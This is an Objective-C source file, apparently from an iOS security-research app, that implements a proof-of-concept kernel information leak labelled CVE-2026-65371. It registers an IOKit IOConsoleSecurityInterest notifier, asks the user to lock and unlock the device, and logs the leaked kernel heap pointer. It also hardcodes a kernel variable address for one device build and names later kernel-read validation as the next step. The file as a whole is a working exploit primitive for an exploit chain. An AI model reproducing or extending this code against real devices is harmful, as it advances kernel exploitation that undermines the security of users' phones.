//
//  P097ConsoleSecLeak.m — CVE-2026-65371 console-security interest leak.
//  vschko/CaseStudies writeup mechanics; implementation is ours.
//  dlsym IOKit only (P059 convention). Zero kernel writes.
//

#import "P097ConsoleSecLeak.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <string.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <CoreFoundation/CoreFoundation.h>
#import <IOKit/IOKitLib.h>
#import "LabLocalTime.h"
#import "LabDeviceProfile.h"

#define P097_BUILD @"p097-consolesec-v2-resume-drain"

/* dlsym prototypes (local per P059/P032 convention) */
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);

#pragma mark - log helpers

static int g_p097_fd = -1;
static NSMutableString *g_p097_buf;

static void p097_flush_line(NSString *out) {
    if (g_p097_buf) [g_p097_buf appendString:out];
    if (g_p097_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_p097_fd, s, strlen(s));
            fcntl(g_p097_fd, F_FULLFSYNC);
        }
    }
}

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (![line hasSuffix:@"\n"]) line = [line stringByAppendingString:@"\n"];
    @synchronized ([P097ConsoleSecLeak class]) { p097_flush_line(line); }
}

#pragma mark - kernel range helpers (mirror of P094)

static BOOL p097_looks_zone(uint64_t v) {
    return v >= 0xFFFFFFE000000000ULL && v < 0xFFFFFFF000000000ULL;
}
static BOOL p097_looks_static(uint64_t v) {
    return v >= 0xFFFFFFF000000000ULL;
}

#pragma mark - callback state

static volatile uint64_t g_p097_arg = 0;
static volatile uint32_t g_p097_msgType = 0;
static volatile int g_p097_hits = 0;

static void p097_interest_cb(void *refcon, io_service_t service,
                             uint32_t messageType, void *messageArgument) {
    uint64_t arg = (uint64_t)(uintptr_t)messageArgument;
    g_p097_msgType = messageType;
    g_p097_arg = arg;
    g_p097_hits++;
    L(@"[*] cb#%d messageType=0x%08x messageArgument=0x%016llx zone=%@ static=%@",
      g_p097_hits, messageType, (unsigned long long)arg,
      p097_looks_zone(arg) ? @"YES" : @"no",
      p097_looks_static(arg) ? @"YES" : @"no");
}

@implementation P097ConsoleSecLeak

+ (NSString *)tap {
    @synchronized ([P097ConsoleSecLeak class]) {
        g_p097_buf = [NSMutableString string];
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"p097_consolesec_log.txt"];
        g_p097_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_APPEND, 0644);

        L(@"=== p097 session %@ BUILD %@ ===", LabLocalMilitaryNow() ?: @"?", P097_BUILD);
        L(@"CVE-2026-65371 gRegistryRoot instance leak via IOConsoleSecurityInterest.");
        L(@"READ-ONLY. One interest notifier, one lock/unlock trigger from you.");
        L(@"Leak = HEAP instance (not slide). Intel row gRegistryRoot = static var slot.");
        L(@"%@", [LabDeviceProfile identBlock] ?: @"ident ?");

        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
        if (!iokit) iokit = RTLD_DEFAULT;
        IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
        IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
        IONotificationPortRef (*pPortCreate)(mach_port_t) = dlsym(iokit, "IONotificationPortCreate");
        CFRunLoopSourceRef (*pPortGetSource)(IONotificationPortRef) = dlsym(iokit, "IONotificationPortGetRunLoopSource");
        IOReturn (*pAddInterest)(IONotificationPortRef, io_service_t, const io_name_t,
                                 IOServiceInterestCallback, void *, io_object_t *) =
            dlsym(iokit, "IOServiceAddInterestNotification");
        void (*pPortDestroy)(IONotificationPortRef) = dlsym(iokit, "IONotificationPortDestroy");
        IOReturn (*pObjRelease)(io_object_t) = dlsym(iokit, "IOObjectRelease");
        mach_port_t (*pPortGetMain)(void) = dlsym(iokit, "kIOMainPortDefault");

        if (!pMatching || !pGet || !pPortCreate || !pPortGetSource || !pAddInterest) {
            L(@"[-] IOKit dlsym incomplete (matching=%p get=%p port=%p src=%p add=%p) - honest miss.",
              (void *)pMatching, (void *)pGet, (void *)pPortCreate, (void *)pPortGetSource, (void *)pAddInterest);
            goto finish;
        }

        mach_port_t mainPort = MACH_PORT_NULL;
        if (pPortGetMain) {
            // kIOMainPortDefault is a constant symbol; dlsym returns its address.
            mainPort = *(mach_port_t *)pPortGetMain;
        }
        if (mainPort == MACH_PORT_NULL) {
            mainPort = 0;
            L(@"[*] main port defaulting to 0 (bootstrap).");
        }

        CFMutableDictionaryRef matching = pMatching("IOPlatformExpertDevice");
        if (!matching) {
            L(@"[-] IOServiceMatching(PlatformExpert) failed - honest miss.");
            goto finish;
        }
        io_service_t svc = pGet(mainPort, matching);
        if (!svc) {
            L(@"[-] IOPlatformExpertDevice service not found - honest miss.");
            goto finish;
        }
        L(@"[*] IOPlatformExpertDevice service ok.");

        IONotificationPortRef np = pPortCreate(mainPort);
        if (!np) {
            L(@"[-] IONotificationPortCreate failed - honest miss.");
            if (pObjRelease) pObjRelease(svc);
            goto finish;
        }
        CFRunLoopAddSource(CFRunLoopGetCurrent(), pPortGetSource(np), kCFRunLoopDefaultMode);

        io_object_t notification = 0;
        IOReturn kr = pAddInterest(np, svc, "IOConsoleSecurityInterest",
                                   p097_interest_cb, NULL, &notification);
        L(@"[*] IOServiceAddInterestNotification kr=0x%x", kr);
        if (kr != KERN_SUCCESS) {
            L(@"[-] interest registration rejected - entitlement/sandbox boundary. Honest miss.");
            if (pPortDestroy) pPortDestroy(np);
            if (pObjRelease) pObjRelease(svc);
            goto finish;
        }

        L(@"[*] NOW LOCK + UNLOCK the device (or lock from control center).");
        L(@"[*] waiting up to 150 s on the run loop (v2 resume-drain: the app");
        L(@"[*]   suspends on lock — the queued event must fire right after unlock).");

        CFAbsoluteTime deadline = CFAbsoluteTimeGetCurrent() + 150.0;
        while (g_p097_hits == 0 && CFAbsoluteTimeGetCurrent() < deadline) {
            CFRunLoopRunInMode(kCFRunLoopDefaultMode, 1.0, false);
            /* v2: also spin a background-eligible drain — the notification
               port's messages queue while suspended; the 1.0 s loop pumps
               them as soon as the app resumes (foreground re-entry). */
            if (g_p097_hits == 0 && CFAbsoluteTimeGetCurrent() < deadline) {
                CFRunLoopRunInMode(kCFRunLoopCommonModes, 0.1, true);
            }
        }

        if (g_p097_hits == 0) {
            L(@"[-] no console-security change observed in 150 s - the notifier");
            L(@"[-] either fires only outside app lifetime on this train, or the");
            L(@"[-] IOConsoleSecurityInterest path changed on 27.x. Honest miss.");
        } else {
            uint64_t arg = g_p097_arg;
            L(@"[+] VERDICT: kIOMessageConsoleSecurityChange=0x%08x arg=0x%016llx",
              g_p097_msgType, (unsigned long long)arg);
            L(@"[+] expect messageType 0xe0000128 and a zone-range instance ptr.");
            L(@"[+] board untouched: leak primitive only. Slide NOT derivable from this value.");
            L(@"[*] later kread validation: instance must match *(gRegistryRoot var slot).");
            L(@"[*] T8101 12377 var slot = 0xFFFFFFF00A934FF8 (Ghidra, intel row gRegistryRoot).");
        }

        if (notification && pObjRelease) pObjRelease(notification);
        if (pPortDestroy) pPortDestroy(np);
        if (pObjRelease) pObjRelease(svc);

finish:
        if (g_p097_fd >= 0) { close(g_p097_fd); g_p097_fd = -1; }
        NSString *out = [g_p097_buf copy];
        g_p097_buf = nil;
        return out;
    }
}

@end